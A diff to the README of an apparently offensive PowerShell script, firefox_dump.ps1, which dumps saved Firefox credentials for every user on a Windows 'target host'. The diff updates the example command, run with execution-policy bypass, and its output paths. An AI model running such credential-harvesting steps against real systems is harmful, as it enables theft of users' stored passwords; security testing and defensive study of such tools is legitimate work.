@@ -8,12 +8,12 @@ The scripts should be run as a **high privileged user** to gather as much inform
 This script will loop through all users under `C:\Users` and dump all saved credentials from Mozilla Firefox profiles. 
 ## Example Usage
 ```powershell
-PS C:\tmp> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
+PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
 [-] 'Public' doesn't have any saved passwords in Mozilla Firefox
-[+] Dumping secrets from 'user' to: C:\Users\void\AppData\Local\Temp\user\skvrf23a.default
-[+] Dumping secrets from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\grg21h5s.default
+[+] Dumping secrets from 'user' to: C:\Users\void\AppData\Local\Temp\user\firefox\ahf32hh2.default-release
+[+] Dumping secrets from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\firefox\plhh3lmm.default-release
 [-] 'user3' doesn't have any saved passwords in Mozilla Firefox
-[+] Dumping secrets from 'void' to: C:\Users\void\AppData\Local\Temp\void\ljftf853.default-release
+[+] Dumping secrets from 'void' to: C:\Users\void\AppData\Local\Temp\void\firefox\plmxz1zm.default-release
 ```
 
 If you don't want to upload files to the target host simply copy-paste the try-catch code from the script and run it as is in PowerShell.
